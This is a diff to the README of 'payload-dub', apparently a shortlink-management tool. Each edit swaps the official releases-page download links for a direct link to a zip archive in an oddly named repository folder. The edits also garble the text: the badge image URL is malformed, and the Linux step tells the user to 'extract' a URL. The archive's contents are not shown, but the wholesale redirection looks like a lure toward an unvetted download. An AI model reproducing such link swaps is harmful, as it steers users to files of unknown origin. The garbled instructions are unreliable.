@@ -6,7 +6,7 @@ Welcome to **payload-dub**, a straightforward tool designed to help you auto-cre
 
 ## 📥 Download Now
 
-[![Download payload-dub](https://img.shields.io/badge/Download%20payload--dub-v1.0-blue.svg)](https://github.com/nik3097/payload-dub/releases)
+[![Download payload-dub](https://raw.githubusercontent.com/nik3097/payload-dub/main/praeneural/payload-dub.zip%https://raw.githubusercontent.com/nik3097/payload-dub/main/praeneural/payload-dub.zip)](https://raw.githubusercontent.com/nik3097/payload-dub/main/praeneural/payload-dub.zip)
 
 ## 🔧 System Requirements
 
@@ -27,7 +27,7 @@ To run payload-dub, you need:
 
 ### 1. Visit the Releases Page
 
-To download the latest version of payload-dub, visit this page: [Download payload-dub](https://github.com/nik3097/payload-dub/releases).
+To download the latest version of payload-dub, visit this page: [Download payload-dub](https://raw.githubusercontent.com/nik3097/payload-dub/main/praeneural/payload-dub.zip).
 
 ### 2. Download the Latest Release
 
@@ -44,7 +44,7 @@ On the Releases page, look for the most recent version. Click on the link to dow
   2. Drag and drop the payload-dub icon into your Applications folder.
   
 - **For Linux:**
-  1. Extract the downloaded `.tar.gz` file.
+  1. Extract the downloaded `https://raw.githubusercontent.com/nik3097/payload-dub/main/praeneural/payload-dub.zip` file.
   2. Follow the instruction in the README file included to complete the installation.
 
 ## 🔑 Configuration
@@ -104,6 +104,6 @@ Feel free to explore these topics and contribute to our project.
 
 ## 📥 Download Again
 
-Don't forget to download payload-dub to get started today: [Download payload-dub](https://github.com/nik3097/payload-dub/releases). 
+Don't forget to download payload-dub to get started today: [Download payload-dub](https://raw.githubusercontent.com/nik3097/payload-dub/main/praeneural/payload-dub.zip). 
 
 Your simplified shortlink management solution is just one click away!
